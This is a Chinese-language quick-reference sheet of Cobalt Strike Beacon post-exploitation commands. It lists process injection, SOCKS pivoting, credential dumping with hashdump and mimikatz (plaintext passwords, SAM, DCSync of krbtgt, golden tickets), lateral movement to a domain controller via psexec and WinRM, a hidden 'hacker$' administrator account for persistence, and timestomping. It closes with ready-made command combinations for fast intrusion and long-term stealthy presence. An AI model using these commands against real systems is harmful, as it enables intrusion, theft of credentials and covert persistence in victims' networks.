# 02 - Beacon 常用命令速查

## 一、 基础命令

| 命令 | 作用 |
| :--- | :--- |
| `help` | 查看所有命令 |
| `sleep 5` | 设置心跳 5 秒 |
| `sleep 60 20` | 心跳 60 秒，抖动 20% |
| `shell whoami` | 执行系统命令 |
| `powershell ...` | 执行 PowerShell |
| `pwd` | 查看当前目录 |
| `ls` / `cd` | 列目录 / 切换目录 |
| `getuid` | 查看当前权限 |
| `clear` | 清空 Beacon 队列 |

## 二、 文件操作

| 命令 | 作用 |
| :--- | :--- |
| `upload /local/file C:\path` | 上传文件 |
| `download C:\path\file` | 下载文件 |
| `rm C:\path` | 删除文件 |
| `mkdir C:\path` | 创建目录 |
| `cat C:\path` | 读取文件内容 |
| `timestomp` | 修改文件时间戳 |

## 三、 进程与会话

| 命令 | 作用 |
| :--- | :--- |
| `ps` | 列出所有进程 |
| `inject <pid> x64 <listener>` | 注入到指定进程 |
| `migrate <pid>` | 进程迁移 |
| `jobkill <jid>` | 结束某个任务 |
| `jobs` | 查看当前任务 |
| `kill <pid>` | 结束进程 |

## 四、 内网代理

| 命令 | 作用 |
| :--- | :--- |
| `socks 1080` | 建立 SOCKS 代理 |
| `socks stop` | 停止代理 |
| `rportfwd 8080 10.0.0.132 22` | 端口转发 |
| `rportfwd stop 8080` | 停止端口转发 |

## 五、 权限提升与凭据

| 命令 | 作用 |
| :--- | :--- |
| `getsystem` | 尝试提权到 SYSTEM |
| `hashdump` | 导出本地哈希 |
| `mimikatz` | 加载 mimikatz 模块 |
| `mimikatz !sekurlsa::logonpasswords` | 抓明文密码 |
| `mimikatz !lsadump::sam` | 导出 SAM 哈希 |
| `mimikatz !lsadump::dcsync /user:krbtgt` | DCSync 导出域控哈希 |
| `mimikatz !kerberos::golden` | 伪造黄金票据 |
| `mimikatz !lsadump::lsa /patch` | 转储 LSA 密钥 |

## 六、 域渗透

| 命令 | 作用 |
| :--- | :--- |
| `net computers` | 列出域内计算机 |
| `net group "domain admins" /domain` | 查看域管理员 |
| `net user /domain` | 列出域用户 |
| `jump psexec <target> <listener>` | psexec 横向 |
| `jump winrm <target> <listener>` | winrm 横向 |
| `jump winrm64 <target> <listener>` | winrm 64 位横向 |

## 七、 权限维持

| 命令 | 作用 |
| :--- | :--- |
| `persist` | 查看持久化选项 |
| `schtasks` | 创建计划任务 |
| `reg` | 操作注册表 |
| `net user hacker$ P@ss /add` | 创建隐藏用户 |
| `net localgroup administrators hacker$ /add` | 加入管理员组 |

## 八、 清理与退出

| 命令 | 作用 |
| :--- | :--- |
| `clear` | 清空 Beacon 队列 |
| `exit` | 退出 Beacon |
| `note <text>` | 给 Beacon 加备注 |
| `socks stop` | 停止 SOCKS 代理 |
| `rportfwd stop <port>` | 停止端口转发 |

## 九、 实战中常用的组合

### 9.1 快速渗透

```
beacon> sleep 5
beacon> shell whoami
beacon> socks 1080
```

### 9.2 长期潜伏

```
beacon> sleep 300 30
beacon> inject <explorer_pid> x64 <listener>
```

### 9.3 抓取凭据

```
beacon> mimikatz !sekurlsa::logonpasswords
beacon> hashdump
```

### 9.4 域内横向

```
beacon> net group "domain admins" /domain
beacon> jump psexec DC01 <listener>
```

## 十、 注意事项

- 所有命令都在 `beacon>` 提示符下执行。
- `mimikatz` 命令需要先加载插件（CS 4.x 默认内置）。
- 命令执行是异步的，需要等待 Beacon 下次回连才看到输出。
- `sleep` 值影响响应速度，调试时设为 5 秒，长期潜伏时设为 300 秒。
- `socks` 和 `rportfwd` 建立后，需要在本地工具（proxychains / nc）中配合使用。
